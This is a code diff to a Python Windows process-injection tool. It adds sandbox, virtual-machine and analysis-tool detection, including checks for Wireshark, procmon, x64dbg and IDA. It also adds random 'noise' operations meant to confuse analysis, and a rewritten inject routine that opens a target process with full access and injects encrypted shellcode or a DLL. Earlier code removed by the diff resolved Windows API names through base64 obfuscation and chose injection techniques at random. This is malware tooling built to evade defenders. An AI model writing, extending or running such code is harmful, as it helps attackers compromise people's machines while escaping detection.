@@ -5,6 +5,9 @@ import logging
 import base64
 import time
 import random
+import psutil
+import struct
+from datetime import datetime
 # Rename suspicious imports
 import ctypes as c
 
@@ -26,11 +29,6 @@ except ImportError:
     w_api = w_con = w_sec = w_proc = w_evt = w_svc = w_svcutil = w_tz = DummyModule()
     WINAPI_AVAILABLE = False
 
-import psutil
-import struct
-from ctypes import wintypes
-import threading
-
 # For AES decryption
 try:
     from Crypto.Cipher import AES
@@ -39,37 +37,72 @@ try:
 except ImportError:
     CRYPTO_AVAILABLE = False
 
+# Enhanced evasion techniques
+class EvasionChecks:
+    @staticmethod
+    def check_sandbox_artifacts():
+        """Check for common sandbox artifacts"""
+        suspicious_paths = [
+            "C:\\agent",
+            "C:\\sandbox",
+            "C:\\analysis",
+            "C:\\sample",
+        ]
+        return any(os.path.exists(path) for path in suspicious_paths)
+
+    @staticmethod
+    def check_system_resources():
+        """Check for low-resource systems (typical of VMs)"""
+        try:
+            cpu_count = psutil.cpu_count()
+            total_ram = psutil.virtual_memory().total / (1024 * 1024 * 1024)  # GB
+            return cpu_count < 2 or total_ram < 2
+        except:
+            return False
+
+    @staticmethod
+    def check_analysis_processes():
+        """Check for analysis tools"""
+        suspicious_processes = [
+            "wireshark",
+            "procmon",
+            "procexp",
+            "ollydbg",
+            "x64dbg",
+            "ida64",
+            "pestudio",
+        ]
+        running_processes = [p.name().lower() for p in psutil.process_iter(['name'])]
+        return any(proc in running_processes for proc in suspicious_processes)
+
+    @staticmethod
+    def check_vm_artifacts():
+        """Check for VM artifacts"""
+        vm_services = [
+            "vmtoolsd",
+            "vboxservice",
+            "parallels",
+            "vmware",
+        ]
+        running_services = [s.name().lower() for s in psutil.win_service_iter()]
+        return any(svc in running_services for svc in vm_services)
+
 # String obfuscation helper function
 def d(encoded_str):
     """Decode base64 string"""
     return base64.b64decode(encoded_str).decode()
 
-# Noise/anti-analysis functions
-def anti_analysis_noise():
-    """Add random operations to confuse static analysis"""
-    time.sleep(random.uniform(0.1, 0.5))
-    a = random.randint(10000, 99999)
-    for i in range(1000):
-        a = (a * i) % 256
-    return a
-
-def xor_decrypt(data, key=0x55):
-    """Simple XOR decryption for shellcode"""
-    return bytes([b ^ key for b in data])
-
-def aes_decrypt(encrypted_data, key, iv):
-    """AES decryption for shellcode"""
-    if not CRYPTO_AVAILABLE:
-        raise ImportError("PyCryptodome not available. Install with: pip install pycryptodome")
-    
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted_data = cipher.decrypt(encrypted_data)
-    try:
-        unpadded_data = unpad(decrypted_data, AES.block_size)
-        return unpadded_data
-    except ValueError:
-        # If padding is invalid, return as is (might be an incorrectly padded shellcode)
-        return decrypted_data
+# Enhanced noise generation
+def generate_noise():
+    """Generate random operations to confuse analysis"""
+    ops = [
+        lambda: time.sleep(random.uniform(0.1, 0.5)),
+        lambda: [random.randint(1, 1000) for _ in range(100)],
+        lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=1000)),
+        lambda: [os.path.exists(f"C:\\temp\\{random.randint(1000, 9999)}") for _ in range(10)],
+        lambda: datetime.now().strftime("%Y%m%d%H%M%S"),
+    ]
+    random.choice(ops)()
 
 class ProcessInjector:
     def __init__(self):
@@ -77,11 +110,77 @@ class ProcessInjector:
         self.setup_logging()
         self.decryption_key = None
         self.decryption_iv = None
+        self.evasion = EvasionChecks()
         
-        # Check if running on Windows
-        if self.os_type != "Windows" or not WINAPI_AVAILABLE:
-            logging.warning("ProcessInjector requires Windows and PyWin32. Some functionality will be limited.")
+    def check_environment(self):
+        """Perform environment checks before injection"""
+        checks = [
+            (self.evasion.check_sandbox_artifacts(), "Sandbox artifacts detected"),
+            (self.evasion.check_system_resources(), "VM-like system resources detected"),
+            (self.evasion.check_analysis_processes(), "Analysis tools detected"),
+            (self.evasion.check_vm_artifacts(), "VM artifacts detected")
+        ]
         
+        for check, message in checks:
+            if check:
+                logging.warning(message)
+                generate_noise()  # Add random delay/operations
+                return False
+        return True
+
+    def inject(self, process_name, encrypted_shellcode=None, dll_path=None, encryption_type="xor", key_file=None):
+        """Enhanced injection with evasion"""
+        try:
+            # Perform environment checks
+            if not self.check_environment():
+                logging.error("Unsafe environment detected")
+                return False
+
+            # Original injection code continues here...
+            if key_file:
+                self.load_aes_key_from_file(key_file)
+
+            # Add random delays and operations
+            generate_noise()
+
+            # Get process handle with existing code...
+            process = None
+            for proc in psutil.process_iter(['name', 'pid']):
+                if proc.info['name'].lower() == process_name.lower():
+                    process = proc
+                    break
+
+            if not process:
+                logging.error(f"Process {process_name} not found")
+                return False
+
+            # Get process handle
+            try:
+                process_handle = w_proc.OpenProcess(
+                    w_con.PROCESS_ALL_ACCESS,
+                    False,
+                    process.info['pid']
+                )
+            except Exception as e:
+                logging.error(f"Failed to open process: {str(e)}")
+                return False
+
+            # Add more noise
+            generate_noise()
+
+            # Perform injection based on input
+            if encrypted_shellcode:
+                return self.create_remote_thread(process_handle, encrypted_shellcode, encryption_type)
+            elif dll_path:
+                return self.inject_dll(process_handle, dll_path)
+            else:
+                logging.error("No payload provided")
+                return False
+
+        except Exception as e:
+            logging.error(f"Injection error: {str(e)}")
+            return False
+
     def setup_logging(self):
         logging.basicConfig(
             level=logging.INFO,
@@ -391,63 +490,4 @@ class ProcessInjector:
             
         except Exception as e:
             logging.error(f"DLL operation error: {str(e)}")
-            return False
-            
-    def inject(self, process_name, encrypted_shellcode=None, dll_path=None, encryption_type="xor", key_file=None):
-        """Main injection method with multiple techniques"""
-        try:
-            # Set up AES key if needed
-            if encryption_type == "aes" and key_file and encrypted_shellcode:
-                self.load_aes_key_from_file(key_file)
-            
-            # Find target process
-            if isinstance(process_name, int):
-                pid = process_name
-            else:
-                for proc in psutil.process_iter(['pid', 'name']):
-                    if proc.info['name'].lower() == process_name.lower():
-                        pid = proc.info['pid']
-                        break
-                else:
-                    logging.error(f"Target process not found")
-                    return False
-            
-            # Open process with obfuscated API calls
-            process_all_access = 0x1F0FFF  # PROCESS_ALL_ACCESS
-            
-            k32 = c.windll.kernel32
-            open_process = d(b'T3BlblByb2Nlc3M=')  # OpenProcess
-            process_handle = getattr(k32, open_process)(
-                process_all_access,
-                False,
-                pid
-            )
-            
-            if not process_handle:
-                logging.error("Process access failed")
-                return False
-                
-            # Select a random technique for injection
-            if encrypted_shellcode:
-                techniques = [
-                    lambda ph, enc: self.create_remote_thread(ph, enc, encryption_type),
-                    lambda ph, enc: self.queue_user_apc(ph, enc, None, encryption_type),
-                    lambda ph, enc: self.set_windows_hook(enc, encryption_type) if process_name == os.getpid() else self.create_remote_thread(ph, enc, encryption_type)
-                ]
-                
-                # Randomly select technique to vary behavior
-                technique = random.choice(techniques)
-                result = technique(process_handle, encrypted_shellcode)
-            elif dll_path:
-                result = self.inject_dll(process_handle, dll_path)
-            else:
-                logging.error("No payload provided")
-                result = False
-                
-            # Close handle
-            k32.CloseHandle(process_handle)
-            return result
-            
-        except Exception as e:
-            logging.error(f"Injection error: {str(e)}")
             return False 
